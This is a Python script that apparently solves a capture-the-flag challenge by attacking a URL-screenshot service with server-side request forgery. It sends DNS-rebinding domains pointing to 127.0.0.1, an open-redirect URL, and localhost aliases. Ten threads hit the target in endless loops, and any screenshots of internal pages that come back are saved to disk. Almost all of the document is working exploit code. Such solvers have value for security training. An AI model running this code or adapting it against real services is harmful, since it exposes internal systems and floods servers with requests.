import requests
import re
import base64
import hashlib
import time
import os
from concurrent.futures import ThreadPoolExecutor

URL = "https://poiuytrewqazx-csc26.cybersecuritychallenge.al/analizo"

PAYLOADS = [
    # Top priority: The User's Rebinding Domains
    "http://08080808.7f000001.rbndr.us",
    "http://08080101.7f000001.rbndr.us",
    
    # Redirect strategy
    "https://httpbin.org/redirect-to?url=http://127.0.0.1",
    "http://localtest.me",
    "http://127.0.0.1.nip.io",
    "http://localhost",
]

# Keep track of seen image hashes to avoid duplicates
seen_hashes = set()

def save_image(b64_data, source_label):
    try:
        img_bytes = base64.b64decode(b64_data)
        h = hashlib.md5(img_bytes).hexdigest()
        
        if h in seen_hashes:
            return False # Duplicate
            
        seen_hashes.add(h)
        
        # Save it
        filename = f"capture_{source_label}_{h[:8]}.png"
        with open(filename, "wb") as f:
            f.write(img_bytes)
            
        print(f"[+] NEW IMAGE CAPTURED! Saved as {filename} (Size: {len(img_bytes)} bytes)")
        return True
    except Exception as e:
        print(f"[-] Error saving image: {e}")
    return False

def attack(payload):
    try:
        # print(f"[*] Testing {payload}...")
        r = requests.post(URL, data={"url": payload, "submit": "Analizo"}, timeout=15)
        
        # Find base64 image
        # Pattern: <img src="data:image/png;base64,..."
        match = re.search(r'src="data:image/png;base64,([^"]+)"', r.text)
        if match:
            b64 = match.group(1)
            # Create a short label for filename (remove http/chars)
            label = re.sub(r'[^a-zA-Z0-9]', '', payload)[-10:] 
            if save_image(b64, label):
                return True
        else:
            # print(f"[-] No image in response for {payload}")
            pass

    except Exception as e:
        # print(f"[-] Request error: {e}")
        pass
    return False

def spammer(domain):
    while True:
        attack(domain)
        time.sleep(0.5)

def main():
    print("Starting Capture Tools (Solver V2)...")
    print("I will spam the payloads and save any UNIQUE screenshots found.")
    print("Look for PNG files in this directory!")
    
    # 1. Try the simple redirects once
    print("--- Phase 1: Redirects & Simple Bypasses ---")
    for p in PAYLOADS[2:]: # Skip first 2 (rebinding) for now
        print(f"Testing {p}")
        attack(p)
        
    # 2. Spam the Rebinding domains indefinitely
    print("\n--- Phase 2: DNS Rebinding Spam (Ctrl+C to stop) ---")
    print(f"Spamming {PAYLOADS[0]} and {PAYLOADS[1]}")
    
    with ThreadPoolExecutor(max_workers=10) as executor:
        # Submit tasks
        futures = []
        for _ in range(5):
            futures.append(executor.submit(spammer, PAYLOADS[0]))
            futures.append(executor.submit(spammer, PAYLOADS[1]))
            
        # Keep main thread alive
        try:
            while True:
                time.sleep(1)
        except KeyboardInterrupt:
            print("Stopping...")

if __name__ == "__main__":
    main()
